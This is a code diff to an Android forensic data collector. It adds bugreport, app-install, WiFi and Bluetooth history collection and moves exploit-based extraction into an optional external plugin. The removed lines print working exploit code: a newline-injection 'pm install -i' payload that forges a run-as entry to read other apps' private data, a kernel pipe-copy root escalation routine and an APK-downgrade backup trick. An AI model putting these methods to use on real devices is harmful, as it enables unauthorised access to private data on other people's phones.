@@ -23,6 +23,7 @@ Requirements:
 """
 from __future__ import annotations
 
+import json
 import os
 import re
 import shutil
@@ -221,7 +222,7 @@ ANDROID_ARTIFACT_TYPES = {
 
     'mobile_android_system_info': {
         'name': 'System Information',
-        'description': 'System logs, packages, settings, usage, accounts, connectivity',
+        'description': 'System logs, packages, settings, usage, accounts, connectivity, bugreport',
         'collection_method': 'system_info',
         'requires_root': False,
         'forensic_value': 'high',
@@ -237,6 +238,10 @@ ANDROID_ARTIFACT_TYPES = {
             'accounts': {'name': 'Registered Accounts'},
             'app_usage': {'name': 'App Usage Statistics'},
             'connectivity': {'name': 'Network Connectivity'},
+            'bugreport': {'name': 'System Bugreport'},
+            'app_install_history': {'name': 'App Installation History'},
+            'wifi_history': {'name': 'WiFi Connection History'},
+            'bluetooth_history': {'name': 'Bluetooth Pairing History'},
         },
     },
 
@@ -1501,7 +1506,17 @@ ALLOWED_CONTENT_URIS = frozenset([
 ALLOWED_DUMPSYS_SERVICES = frozenset([
     'battery', 'wifi', 'netpolicy', 'usagestats', 'activity',
     'package', 'meminfo', 'cpuinfo', 'procstats', 'diskstats',
-    'telecom',  # call log fallback (Android 10+ restricts READ_CALL_LOG)
+    'telecom',           # call log fallback (Android 10+ restricts READ_CALL_LOG)
+    'bluetooth_manager',  # BT pairing history, connected devices
+    'connectivity',       # Network connection states
+    'deviceidle',         # Doze mode history (usage patterns)
+    'notification',       # Notification history (message previews)
+    'input',              # Input device info
+    'mount',              # Storage mount points
+    'alarm',              # Scheduled alarms (app behavior)
+    'jobscheduler',       # Background job history
+    'accessibility',      # Accessibility services state
+    'content',            # Content provider registry
 ])
 
 # Whitelist of allowed settings namespaces (immutable)
@@ -1537,6 +1552,20 @@ def validate_dumpsys_service(service: str) -> bool:
 def validate_settings_namespace(namespace: str) -> bool:
     """Validate settings namespace against whitelist to prevent command injection."""
     return namespace in ALLOWED_SETTINGS_NAMESPACES
+
+
+def _load_advanced_plugin():
+    """Load optional pro plugin for advanced collection methods.
+
+    Returns plugin instance if installed, None otherwise.
+    The pro plugin provides additional extraction methods for licensed forensic use.
+    Install separately: pip install unjaena-collector-pro
+    """
+    try:
+        from unjaena_collector_pro import AdvancedPlugin
+        return AdvancedPlugin()
+    except ImportError:
+        return None
 
 
 class AndroidCollector:
@@ -2295,7 +2324,7 @@ class AndroidCollector:
         progress_callback: Optional[Callable[[str], None]]
     ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
         """
-        System information batch collection (8 sub-types).
+        System information batch collection (12 sub-types).
         Each sub-type yields with its own artifact_type for server parser compatibility.
         """
         sub_types = artifact_info.get('sub_types', {})
@@ -2334,6 +2363,22 @@ class AndroidCollector:
             elif sub_key == 'connectivity':
                 yield from self._collect_connectivity_info(
                     'mobile_android_connectivity', sub_dir, progress_callback
+                )
+            elif sub_key == 'bugreport':
+                yield from self._collect_bugreport(
+                    'mobile_android_bugreport', sub_dir, progress_callback
+                )
+            elif sub_key == 'app_install_history':
+                yield from self._collect_app_install_history(
+                    'mobile_android_app_install_history', sub_dir, progress_callback
+                )
+            elif sub_key == 'wifi_history':
+                yield from self._collect_wifi_history(
+                    'mobile_android_wifi_history', sub_dir, progress_callback
+                )
+            elif sub_key == 'bluetooth_history':
+                yield from self._collect_bluetooth_history(
+                    'mobile_android_bluetooth_history', sub_dir, progress_callback
                 )
 
     def _collect_db(
@@ -2933,69 +2978,50 @@ class AndroidCollector:
 
         if not phase2_collected and package:
             sdk = self.device_info.sdk_version if self.device_info else 0
-            patch = self.device_info.security_patch if self.device_info else ''
 
-            # 3a. PM-RUNAS-044 (Android 12-13, SDK 31-33)
-            # Newline injection in PackageInstallerService for run-as bypass
-            if 31 <= sdk <= 33 and (not patch or patch < '2024-10-01'):
+            # 3a. Advanced access via optional pro plugin (requires separate installation)
+            # Plugin provides additional extraction methods for authorized forensic use.
+            # Install: pip install unjaena-collector-pro (licensed agencies only)
+            plugin = _load_advanced_plugin()
+            if plugin and not phase3_collected:
                 if progress_callback:
-                    progress_callback(f"[Phase 3a] Trying PM-RUNAS-044 for {package}")
-                for item in self._collect_via_elevated_access(
-                    artifact_type, package, db_paths, output_dir, progress_callback
+                    progress_callback(f"[Phase 3a] Trying advanced access (pro plugin) for {package}")
+                for item in plugin.collect_elevated(
+                    artifact_type, package, sdk,
+                    self.device_info.security_patch if self.device_info else '',
+                    db_paths, output_dir, progress_callback
                 ):
                     phase3_collected = True
                     yield item
 
-            # 3b. KPIPE-COPY-847 kernel pipe copy (Android 12 with applicable kernel 5.8-5.16)
-            # Kernel pipe buffer method for file access
-            if not phase3_collected and sdk >= 31:
-                if progress_callback:
-                    progress_callback(f"[Phase 3b] Trying kernel pipe copy (KPIPE-COPY-847) for {package}")
-                for item in self._collect_via_kpipe_copy(
-                    artifact_type, package, db_paths, output_dir, progress_callback
-                ):
-                    phase3_collected = True
-                    yield item
-
-            # 3c. Procfs-based extraction (file descriptor leak)
+            # 3b. Procfs-based extraction
             # Works when target app is running and /proc/<pid>/fd is accessible
             if not phase3_collected:
                 if progress_callback:
-                    progress_callback(f"[Phase 3c] Trying procfs extraction for {package}")
+                    progress_callback(f"[Phase 3b] Trying procfs extraction for {package}")
                 for item in self._collect_via_procfs(
                     artifact_type, package, db_paths, output_dir, progress_callback
                 ):
                     phase3_collected = True
                     yield item
 
-            # 3d. Content Provider enumeration and query
+            # 3c. Content Provider enumeration and query
             # Query exposed content providers without root
             if not phase3_collected:
                 if progress_callback:
-                    progress_callback(f"[Phase 3d] Trying Content Provider query for {package}")
+                    progress_callback(f"[Phase 3c] Trying Content Provider query for {package}")
                 for item in self._collect_via_content_provider(
                     artifact_type, package, db_paths, output_dir, progress_callback
                 ):
                     phase3_collected = True
                     yield item
 
-            # 3e. ADB Backup extraction (allowBackup=true apps)
+            # 3d. ADB Backup extraction (allowBackup=true apps)
             # Requires user interaction on device to confirm backup
             if not phase3_collected:
                 if progress_callback:
-                    progress_callback(f"[Phase 3e] Trying ADB Backup for {package}")
+                    progress_callback(f"[Phase 3d] Trying ADB Backup for {package}")
                 for item in self._collect_via_adb_backup(
-                    artifact_type, package, db_paths, output_dir, progress_callback
-                ):
-                    phase3_collected = True
-                    yield item
-
-            # 3f. APK Downgrade + ADB Backup
-            # Install older APK version (allowBackup=true) over current to enable backup
-            if not phase3_collected:
-                if progress_callback:
-                    progress_callback(f"[Phase 3f] Trying APK downgrade strategy for {package}")
-                for item in self._collect_via_apk_downgrade(
                     artifact_type, package, db_paths, output_dir, progress_callback
                 ):
                     phase3_collected = True
@@ -3124,433 +3150,6 @@ class AndroidCollector:
                     'package': package,
                     'source': 'debuggable_app',
                 }
-
-    def _collect_via_elevated_access(
-        self,
-        artifact_type: str,
-        package: str,
-        db_paths: List[str],
-        output_dir: Path,
-        progress_callback: Optional[Callable[[str], None]]
-    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
-        """
-        Access-method PM-RUNAS-044 to extract private app data from non-debuggable apps.
-
-        This method applies to Android 12 (SDK 31), 12L (SDK 32), and 13 (SDK 33).
-        It uses a newline insertion technique in PackageInstallerService.java's
-        createSessionInternal() function, allowing 'run-as any app' elevated access.
-
-        Reference: https://github.com/0xbinder/PM-RUNAS-044
-        Advisory: https://rtx.meta.security/analysis/2024/03/04/Android-run-as-forgery.html
-
-        Steps:
-            1. Get target package UID
-            2. Find/push a helper APK for the access method
-            3. Execute access sequence via pm install -i
-            4. Use 'run-as victim' to access target app data
-            5. Extract data via tar and pull to local
-        """
-        sdk = int(self.device_info.sdk_version or 0)
-
-        # PM-RUNAS-044 only affects Android 12-13 (SDK 31-33)
-        if sdk < 31 or sdk > 33:
-            logger.debug(f"[PM-RUNAS-044] SDK {sdk} not applicable (requires 31-33)")
-            return
-
-        if progress_callback:
-            progress_callback(f"[PM-RUNAS-044] Attempting elevated access for {package}")
-
-        logger.info(f"[PM-RUNAS-044] Accessing data for package: {package} (SDK {sdk})")
-
-        # Step 1: Get target package UID
-        uid = self._get_target_package_uid(package)
-        if not uid:
-            logger.warning(f"[PM-RUNAS-044] Failed to get UID for {package}")
-            return
-
-        # Step 2: Find a dummy APK on device or push one
-        dummy_apk = self._find_or_push_helper_apk()
-        if not dummy_apk:
-            logger.warning("[PM-RUNAS-044] No APK available for access method")
-            return
-
-        apk_filename = Path(dummy_apk).name
-
-        # Step 3: Execute the access sequence
-        access_success = self._execute_access_sequence(uid, apk_filename)
-        if not access_success:
-            logger.warning("[PM-RUNAS-044] Access sequence failed")
-            return
-
-        # Step 4: Setup extraction directory
-        extract_dir = '/data/local/tmp/adv_extract'
-        tar_path = f'{extract_dir}/app_data.tar'
-
-        setup_cmds = [
-            f'rm -rf {extract_dir}',
-            f'mkdir -p {extract_dir}',
-            f'touch {tar_path}',
-            f'chmod -R 0777 {extract_dir}',
-        ]
-        for cmd in setup_cmds:
-            self._adb_shell(cmd)
-
-        # Step 5: Use 'run-as victim' to tar the target app data
-        # The method creates a temporary "victim" package entry pointing to target app's data
-        tar_cmd = f'run-as victim sh -c "cd /data/data && tar -cf {tar_path} {shlex.quote(package)} 2>/dev/null"'
-        _, rc = self._adb_shell(tar_cmd)
-
-        if rc != 0:
-            # Alternative: try direct tar without cd
-            tar_cmd_alt = f'run-as victim tar -cf {tar_path} -C /data/data {shlex.quote(package)} 2>/dev/null'
-            _, rc = self._adb_shell(tar_cmd_alt)
-
-        if rc != 0:
-            logger.warning(f"[PM-RUNAS-044] Failed to tar {package} data")
-            self._cleanup_access_temp(extract_dir)
-            return
-
-        # Step 6: Pull tar file to local
-        local_tar_path = output_dir / 'advanced_access' / f'{package}_data.tar'
-        local_tar_path.parent.mkdir(parents=True, exist_ok=True)
-
-        try:
-            success = self._adb_pull(tar_path, str(local_tar_path))
-        except Exception as e:
-            logger.error(f"[PM-RUNAS-044] Pull failed: {e}")
-            self._cleanup_access_temp(extract_dir)
-            return
-
-        if not success or not local_tar_path.exists() or local_tar_path.stat().st_size == 0:
-            logger.warning("[PM-RUNAS-044] Tar file pull failed or empty")
-            self._cleanup_access_temp(extract_dir)
-            return
-
-        # Step 7: Extract tar and yield artifacts
-        extract_local_dir = output_dir / 'advanced_access' / package
-        extract_local_dir.mkdir(parents=True, exist_ok=True)
-
-        try:
-            import tarfile
-            with tarfile.open(local_tar_path, 'r') as tar:
-                # [SECURITY] Path traversal prevention — filter members before extraction
-                safe_members = []
-                resolved_base = extract_local_dir.resolve()
-                for member in tar.getmembers():
-                    # Block symlinks and hardlinks (can point outside extraction dir)
-                    if member.issym() or member.islnk():
-                        logger.warning(f"[PM-RUNAS-044] Skipping symlink/hardlink tar member: {member.name}")
-                        continue
-                    member_path = (extract_local_dir / member.name).resolve()
-                    if not str(member_path).startswith(str(resolved_base)):
-                        logger.warning(f"[PM-RUNAS-044] Skipping unsafe tar member: {member.name}")
-                        continue
-                    safe_members.append(member)
-                tar.extractall(path=extract_local_dir, members=safe_members)
-
-            if progress_callback:
-                progress_callback(f"[PM-RUNAS-044] Extracted {package} data successfully")
-
-            # Yield extracted files matching db_paths or all files if no specific paths
-            for root, _, files in os.walk(extract_local_dir):
-                for fname in files:
-                    fpath = Path(root) / fname
-                    rel_path = fpath.relative_to(extract_local_dir)
-
-                    # Filter by db_paths if specified
-                    if db_paths:
-                        matched = any(
-                            str(rel_path).endswith(db_p.lstrip('./'))
-                            or Path(db_p).name == fname
-                            for db_p in db_paths
-                        )
-                        if not matched:
-                            continue
-
-                    sha256 = hashlib.sha256()
-                    with open(fpath, 'rb') as f:
-                        for chunk in iter(lambda: f.read(65536), b''):
-                            sha256.update(chunk)
-
-                    yield str(fpath), {
-                        'artifact_type': artifact_type,
-                        'original_path': f'/data/data/{package}/{rel_path}',
-                        'filename': fname,
-                        'size': fpath.stat().st_size,
-                        'sha256': sha256.hexdigest(),
-                        'device_serial': self.device_info.serial,
-                        'device_model': self.device_info.model,
-                        'android_version': self.device_info.android_version,
-                        'collected_at': datetime.utcnow().isoformat(),
-                        'collection_method': 'pm_runas_044',
-                        'root_used': False,
-                        'package': package,
-                        'source': 'elevated_access',
-                        'access_method_id': 'PM-RUNAS-044',
-                    }
-
-        except Exception as e:
-            logger.error(f"[PM-RUNAS-044] Extraction failed: {e}")
-        finally:
-            # Cleanup
-            self._cleanup_access_temp(extract_dir)
-
-    def _get_target_package_uid(self, package: str) -> Optional[str]:
-        """Get the UID of a package for PM-RUNAS-044 access method."""
-        cmd = f'pm list packages -U 2>/dev/null | grep -F "package:{package} "'
-        output, rc = self._adb_shell(cmd)
-
-        if rc != 0 or not output:
-            # Fallback: try dumpsys
-            cmd_alt = f'dumpsys package {shlex.quote(package)} 2>/dev/null | grep -E "userId="'
-            output, _ = self._adb_shell(cmd_alt)
-            if output:
-                match = re.search(r'userId=(\d+)', output)
-                if match:
-                    return match.group(1)
-            return None
-
-        # Parse: package:com.example.app uid:10123
-        match = re.search(r'uid:(\d+)', output)
-        if match:
-            uid = match.group(1)
-            logger.debug(f"[PM-RUNAS-044] Got UID {uid} for {package}")
-            return uid
-        return None
-
-    def _find_or_push_helper_apk(self) -> Optional[str]:
-        """Find an existing APK on device or return None."""
-        # Check for common pre-existing APKs in /data/local/tmp
-        check_cmd = 'ls /data/local/tmp/*.apk 2>/dev/null | head -1'
-        output, rc = self._adb_shell(check_cmd)
-
-        if rc == 0 and output and output.strip().endswith('.apk'):
-            apk_path = output.strip().split('\n')[0]
-            logger.debug(f"[PM-RUNAS-044] Found existing APK: {apk_path}")
-            return apk_path
-
-        # Check for any system APK we can reference (read-only, but usable)
-        system_apk_cmd = 'pm path com.android.settings 2>/dev/null | head -1'
-        output, rc = self._adb_shell(system_apk_cmd)
-
-        if rc == 0 and output:
-            # Output format: package:/system/priv-app/Settings/Settings.apk
-            match = re.search(r'package:(.+\.apk)', output)
-            if match:
-                apk_path = match.group(1)
-                # Copy to /data/local/tmp for the access method
-                tmp_apk = '/data/local/tmp/helper_access.apk'
-                copy_cmd = f'cp {shlex.quote(apk_path)} {tmp_apk} 2>/dev/null'
-                _, rc = self._adb_shell(copy_cmd)
-                if rc == 0:
-                    logger.debug(f"[PM-RUNAS-044] Copied system APK to {tmp_apk}")
-                    return tmp_apk
-
-        logger.warning("[PM-RUNAS-044] No suitable APK found on device")
-        return None
-
-    def _execute_access_sequence(self, uid: str, apk_filename: str) -> bool:
-        """
-        Execute the PM-RUNAS-044 payload injection.
-
-        The sequence uses newline insertion in pm install -i parameter
-        to create a fake 'victim' entry in /data/system/packages.list.
-        """
-        # Construct the payload: newline injection in -i (installer) parameter
-        # creates fake 'victim' entry in /data/system/packages.list
-        # Using $'...' syntax for shell to interpret \n as newline
-        # Android sh does not support $'...' syntax — use printf to inject newline
-        line1 = f"@null"
-        line2 = f"victim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"
-        install_cmd = (
-            f"pm install -i "
-            f"\"$(printf '%s\\n%s' {shlex.quote(line1)} {shlex.quote(line2)})\" "
-            f"/data/local/tmp/{shlex.quote(apk_filename)} 2>&1"
-        )
-
-        output, rc = self._adb_shell(install_cmd)
-
-        # Check for success - the install itself may fail but the injection might work
-        if output and 'Success' in output:
-            logger.info("[PM-RUNAS-044] Payload injection succeeded")
-            return True
-
-        # Even if install reports failure, the injection may have worked
-        # Verify by testing run-as victim
-        test_cmd = 'run-as victim id 2>&1'
-        test_output, test_rc = self._adb_shell(test_cmd)
-
-        if test_rc == 0 and test_output and 'uid=' in test_output:
-            logger.info("[PM-RUNAS-044] Payload injection verified via run-as")
-            return True
-
-        logger.debug(f"[PM-RUNAS-044] Install output: {output}")
-        return False
-
-    def _cleanup_access_temp(self, extract_dir: str) -> None:
-        """Clean up PM-RUNAS-044 access artifacts from device."""
-        cleanup_cmds = [
-            f'rm -rf {extract_dir}',
-            'rm -f /data/local/tmp/helper_access.apk 2>/dev/null',
-            'pm uninstall victim 2>/dev/null',  # Try to clean up fake package
-        ]
-        for cmd in cleanup_cmds:
-            try:
-                self._adb_shell(cmd)
-            except Exception:
-                pass
-
-    # =========================================================================
-    # KPIPE-COPY-847 (kernel pipe copy) - Linux Kernel 5.8+ Privilege Escalation
-    # =========================================================================
-
-    def _collect_via_kpipe_copy(
-        self,
-        artifact_type: str,
-        package: str,
-        db_paths: List[str],
-        output_dir: Path,
-        progress_callback: Optional[Callable[[str], None]]
-    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
-        """
-        Access-method KPIPE-COPY-847 (kernel pipe copy) to extract private app data.
-
-        This method applies to Linux kernel 5.8+ (Android 12 with certain kernels).
-        It allows overwriting read-only files by using a technique in pipe buffer handling.
-
-        Reference: https://github.com/polygraphene/KpipeCopy-Android
-        Advisory: https://kernel-pipe-technique.info/
-
-        Note: This requires pushing a native binary to execute the access method.
-        """
-        # Check kernel version compatibility
-        kernel_info = self._kpipe_copy_check_applicable()
-        if not kernel_info['applicable']:
-            logger.debug(f"[kernel pipe copy] Kernel not applicable: {kernel_info.get('version', 'unknown')}")
-            return
-
-        if progress_callback:
-            progress_callback(f"[kernel pipe copy] Kernel {kernel_info['version']} may be compatible")
-
-        logger.info(f"[kernel pipe copy] Attempting access for {package}")
-
-        # For kernel pipe copy, we need to push a native access binary
-        # This is a detection/preparation phase - actual method requires compiled binary
-        access_binary = self._kpipe_copy_prepare_tool()
-        if not access_binary:
-            logger.warning("[kernel pipe copy] Could not prepare access binary")
-            return
-
-        # Execute access method to gain temporary elevated access
-        root_shell = self._kpipe_copy_run(access_binary)
-        if not root_shell:
-            logger.warning("[kernel pipe copy] Access-method execution failed")
-            return
-
-        # Extract data using elevated privileges
-        yield from self._extract_with_root_shell(
-            artifact_type, package, db_paths, output_dir, progress_callback,
-            collection_method='kpipe_copy',
-            access_method_id='KPIPE-COPY-847'
-        )
-
-    def _kpipe_copy_check_applicable(self) -> Dict[str, Any]:
-        """Check if kernel is compatible with kernel pipe copy (KPIPE-COPY-847)."""
-        result = {'applicable': False, 'version': None, 'reason': None}
-
-        # Get kernel version
-        output, rc = self._adb_shell('uname -r 2>/dev/null')
-        if rc != 0 or not output:
-            result['reason'] = 'Cannot determine kernel version'
-            return result
-
-        kernel_version = output.strip()
-        result['version'] = kernel_version
-
-        # Parse version: applicable if 5.8 <= version < 5.16.11 or 5.15.25 or 5.10.102
-        try:
-            match = re.match(r'^(\d+)\.(\d+)\.?(\d+)?', kernel_version)
-            if not match:
-                result['reason'] = 'Cannot parse kernel version'
-                return result
-
-            major = int(match.group(1))
-            minor = int(match.group(2))
-            patch = int(match.group(3)) if match.group(3) else 0
-
-            # Vulnerable: 5.8 <= kernel < patched versions
-            if major == 5:
-                if minor >= 8 and minor < 16:
-                    # Check for patched versions
-                    if minor == 10 and patch >= 102:
-                        result['reason'] = 'Patched version 5.10.102+'
-                    elif minor == 15 and patch >= 25:
-                        result['reason'] = 'Patched version 5.15.25+'
-                    else:
-                        result['applicable'] = True
-                elif minor == 16 and patch < 11:
-                    result['applicable'] = True
-            elif major > 5:
-                # Kernel 6.x - check if patched
-                result['reason'] = 'Kernel 6.x - likely patched'
-
-        except (ValueError, AttributeError) as e:
-            result['reason'] = f'Version parse error: {e}'
-
-        return result
-
-    def _kpipe_copy_prepare_tool(self) -> Optional[str]:
-        """
-        Prepare kernel pipe copy access binary.
-
-        In a real forensics scenario, you would:
-        1. Cross-compile the binary for the target architecture (arm64/arm/x86)
-        2. Push the binary to /data/local/tmp
-        3. Make it executable
-
-        Returns path to access binary on device, or None if preparation fails.
-        """
-        # Check device architecture
-        arch_output, _ = self._adb_shell('getprop ro.product.cpu.abi 2>/dev/null')
-        arch = arch_output.strip() if arch_output else 'unknown'
-
-        # Check if pre-compiled binary exists on device (from previous forensics session)
-        access_tool_path = '/data/local/tmp/kpipe_access_tool'
-        check_cmd = f'test -x {access_tool_path} && echo "exists"'
-        output, rc = self._adb_shell(check_cmd)
-
-        if output and 'exists' in output:
-            logger.debug(f"[kernel pipe copy] Using existing access tool at {access_tool_path}")
-            return access_tool_path
-
-        # Note: In production, you would push the appropriate binary here
-        # For now, return None to indicate binary needs to be provided
-        logger.info(f"[kernel pipe copy] Access-method binary not found. Architecture: {arch}")
-        logger.info("[kernel pipe copy] To use kernel pipe copy, push compiled binary to /data/local/tmp/kpipe_access_tool")
-        return None
-
-    def _kpipe_copy_run(self, access_binary: str) -> bool:
-        """Execute kernel pipe copy method to gain elevated privileges."""
-        # The method typically modifies /etc/passwd or similar to gain root
-        # After access, we can access protected files
-
-        # Execute access method
-        output, rc = self._adb_shell(f'timeout 30 {access_binary} 2>&1')
-
-        if rc == 0 and output:
-            # Check if we got root
-            id_output, _ = self._adb_shell('id 2>/dev/null')
-            if id_output and 'uid=0' in id_output:
-                logger.info("[kernel pipe copy] Successfully gained root access")
-                return True
-
-        logger.debug(f"[kernel pipe copy] Access-method output: {output}")
-        return False
-
-    # =========================================================================
-    # ADB Backup Extraction (for allowBackup=true apps)
-    # =========================================================================
-
     def _collect_via_adb_backup(
         self,
         artifact_type: str,
@@ -3735,132 +3334,6 @@ class AndroidCollector:
         except Exception as e:
             logger.error(f"[ADB Backup] Extraction error: {e}")
             return False
-
-    # =========================================================================
-    # APK Downgrade + Backup Strategy
-    # =========================================================================
-
-    def _collect_via_apk_downgrade(
-        self,
-        artifact_type: str,
-        package: str,
-        db_paths: List[str],
-        output_dir: Path,
-        progress_callback: Optional[Callable[[str], None]]
-    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
-        """
-        Attempt to enable ADB backup by installing an older APK version.
-
-        Some app versions had allowBackup=true before the developer disabled it.
-        Installing an older APK signed with the SAME certificate over the current
-        version preserves existing data and enables ADB backup.
-
-        Steps:
-        1. Check if a downgrade candidate exists (local cache or APKPure lookup)
-        2. Install older APK with -r -d (replace, allow downgrade)
-        3. Run ADB backup
-        4. Reinstall original (restore latest version, keeping data)
-
-        Notes:
-        - Requires an older APK with the same signing certificate
-        - Samsung devices may block downgrade installs; try with -t flag
-        - This is a standard technique used by commercial forensic tools
-        """
-        if progress_callback:
-            progress_callback(f"[APK Downgrade] Checking candidates for {package}")
-
-        # Check for locally cached downgrade APKs
-        downgrade_apk = self._find_downgrade_apk(package)
-        if not downgrade_apk:
-            logger.debug(f"[APK Downgrade] No downgrade candidate found for {package}")
-            return
-
-        logger.info(f"[APK Downgrade] Found candidate: {downgrade_apk}")
-        if progress_callback:
-            progress_callback(f"[APK Downgrade] Candidate: {downgrade_apk.name}")
-
-        # Install older APK over current (keep data, allow downgrade)
-        if progress_callback:
-            progress_callback(f"[APK Downgrade] Installing older version (-r -d)")
-
-        rc = self._run_system_adb_install(str(downgrade_apk), allow_downgrade=True)
-        if rc != 0:
-            # Try with -t (allow test packages) as fallback
-            rc = self._run_system_adb_install(str(downgrade_apk), allow_downgrade=True, test_pkg=True)
-        if rc != 0:
-            if progress_callback:
-                progress_callback(f"[APK Downgrade] Install failed — cert mismatch or blocked")
-            return
-
-        if progress_callback:
-            progress_callback(f"[APK Downgrade] Older version installed, attempting backup")
-
-        try:
-            # Run ADB backup now that allowBackup may be enabled
-            for item in self._collect_via_adb_backup(
-                artifact_type, package, db_paths, output_dir, progress_callback
-            ):
-                yield item
-        finally:
-            # Reinstall latest APK to restore the original version
-            original_apk = self._find_latest_device_apk(package)
-            if original_apk:
-                if progress_callback:
-                    progress_callback(f"[APK Downgrade] Restoring original APK")
-                self._run_system_adb_install(str(original_apk), allow_downgrade=False)
-
-    def _find_downgrade_apk(self, package: str) -> Optional[Path]:
-        """
-        Look for a locally cached downgrade APK candidate.
-
-        Searches in:
-        - <collector_root>/resources/apk_cache/<package>/
-        - User home / .forensic_collector / apk_cache / <package> /
-        """
-        search_dirs = [
-            Path(__file__).parent.parent.parent / "resources" / "apk_cache" / package,
-            Path.home() / ".forensic_collector" / "apk_cache" / package,
-        ]
-        for d in search_dirs:
-            if d.is_dir():
-                candidates = sorted(d.glob("*.apk"), key=lambda f: f.stat().st_mtime)
-                if candidates:
-                    return candidates[0]
-        return None
-
-    def _find_latest_device_apk(self, package: str) -> Optional[Path]:
-        """Pull the current APK from the device to a temp location (for restore)."""
-        out_raw, rc = self._adb_shell(f"pm path {shlex.quote(package)}")
-        if rc != 0 or not out_raw:
-            return None
-        m = re.search(r"package:(.+\.apk)", out_raw.strip())
-        if not m:
-            return None
-        remote_apk = m.group(1).strip()
-        tmp_path = Path(tempfile.mkdtemp()) / f"{package}_latest.apk"
-        ok = self._adb_pull(remote_apk, str(tmp_path))
-        return tmp_path if ok and tmp_path.exists() else None
-
-    def _run_system_adb_install(
-        self,
-        apk_path: str,
-        allow_downgrade: bool = False,
-        test_pkg: bool = False,
-    ) -> int:
-        """Run adb install with optional downgrade and test flags."""
-        args = ["install", "-r"]
-        if allow_downgrade:
-            args.append("-d")
-        if test_pkg:
-            args.append("-t")
-        args.append(apk_path)
-        _, rc = self._run_system_adb(args, timeout=120)
-        return rc
-
-    # =========================================================================
-    # Frida Gadget Injection (Non-Root, Destructive)
-    # =========================================================================
-
     def _collect_via_gadget_injection(
         self,
         artifact_type: str,
@@ -4540,6 +4013,445 @@ class AndroidCollector:
                     'collection_method': f'dumpsys_{source_name}',
                     'root_used': False,
                 }
+
+    # ======================================================================
+    # Phase 1: Extended System Information Collection
+    # Bugreport, app install history, WiFi history, Bluetooth history
+    # ======================================================================
+
+    def _collect_bugreport(
+        self,
+        artifact_type: str,
+        output_dir: Path,
+        progress_callback: Optional[Callable[[str], None]]
+    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
+        """
+        Collect bugreport: comprehensive system state dump.
+
+        Captures WiFi history, battery stats, BT pairing, all dumpsys outputs,
+        logcat, kernel logs, and more in a single zip file. Equivalent to
+        20+ individual dumpsys calls.
+
+        Uses system adb binary (bugreport requires host-side adb command).
+        Timeout set to 120s as bugreport typically takes 60-90 seconds.
+        """
+        if progress_callback:
+            progress_callback("[Non-Root] Collecting bugreport (this may take 60-90 seconds)...")
+
+        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
+        bugreport_path = output_dir / f"bugreport_{timestamp}.zip"
+
+        # adb bugreport must be run as a host-side adb command, not via shell
+        # bugreport takes 2-3 minutes on older devices
+        output, rc = self._run_system_adb(
+            ['bugreport', str(bugreport_path)],
+            timeout=300
+        )
+
+        if rc == 0 and bugreport_path.exists() and bugreport_path.stat().st_size > 0:
+            sha256 = hashlib.sha256()
+            with open(bugreport_path, 'rb') as f:
+                for chunk in iter(lambda: f.read(65536), b''):
+                    sha256.update(chunk)
+
+            logger.info(
+                f"[Bugreport] Collected successfully: "
+                f"{bugreport_path.stat().st_size // 1024}KB"
+            )
+
+            yield str(bugreport_path), {
+                'artifact_type': artifact_type,
+                'filename': bugreport_path.name,
+                'size': bugreport_path.stat().st_size,
+                'sha256': sha256.hexdigest(),
+                'device_serial': self.device_info.serial,
+                'device_model': self.device_info.model,
+                'android_version': self.device_info.android_version,
+                'collected_at': datetime.utcnow().isoformat(),
+                'collection_method': 'adb_bugreport',
+                'root_used': False,
+            }
+        else:
+            error_msg = output.strip()[:200] if output else 'Unknown error'
+            logger.warning(f"[Bugreport] Collection failed: {error_msg}")
+            yield '', {
+                'artifact_type': artifact_type,
+                'status': 'error',
+                'error': f'Bugreport collection failed: {error_msg}',
+            }
+
+    def _collect_app_install_history(
+        self,
+        artifact_type: str,
+        output_dir: Path,
+        progress_callback: Optional[Callable[[str], None]]
+    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
+        """
+        Extract app installation and update timeline from package manager.
+
+        Collects firstInstallTime, lastUpdateTime, and versionName for each
+        third-party package. Useful for establishing software installation
+        timeline without root access.
+
+        Output: app_install_history.jsonl (one JSON object per line)
+        """
+        if progress_callback:
+            progress_callback("[Non-Root] Collecting app installation history")
+
+        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
+
+        # Step 1: Get list of third-party packages with file paths
+        cmd = 'pm list packages -3'
+        output, rc = self._adb_shell(cmd)
+
+        if rc != 0 or not output or not output.strip():
+            logger.warning("[AppInstallHistory] Failed to list packages")
+            yield '', {
+                'artifact_type': artifact_type,
+                'status': 'error',
+                'error': 'Failed to list third-party packages',
+            }
+            return
+
+        packages = []
+        for line in output.strip().split('\n'):
+            line = line.strip()
+            if line.startswith('package:'):
+                pkg_name = line[len('package:'):]
+                if pkg_name and re.match(r'^[a-zA-Z0-9._]+$', pkg_name):
+                    packages.append(pkg_name)
+
+        if not packages:
+            logger.info("[AppInstallHistory] No third-party packages found")
+            return
+
+        if progress_callback:
+            progress_callback(
+                f"[Non-Root] Extracting install timestamps for {len(packages)} apps"
+            )
+
+        # Step 2: For each package, extract install/update timestamps
+        records = []
+        for pkg in packages:
+            # pm dump is safe — only reads package metadata
+            cmd = (
+                f'pm dump {shlex.quote(pkg)} '
+                f'| grep -E "firstInstallTime|lastUpdateTime|versionName"'
+            )
+            pkg_output, pkg_rc = self._adb_shell(cmd)
+
+            if pkg_rc != 0 or not pkg_output or not pkg_output.strip():
+                continue
+
+            record = {'package': pkg}
+            for info_line in pkg_output.strip().split('\n'):
+                info_line = info_line.strip()
+                if 'firstInstallTime=' in info_line:
+                    record['first_install'] = info_line.split('=', 1)[1].strip()
+                elif 'lastUpdateTime=' in info_line:
+                    record['last_update'] = info_line.split('=', 1)[1].strip()
+                elif 'versionName=' in info_line:
+                    record['version'] = info_line.split('=', 1)[1].strip()
+
+            if 'first_install' in record or 'last_update' in record:
+                records.append(record)
+
+        if not records:
+            logger.info("[AppInstallHistory] No install timestamps extracted")
+            return
+
+        # Step 3: Write JSONL output
+        filename = f"app_install_history_{timestamp}.jsonl"
+        local_path = output_dir / filename
+
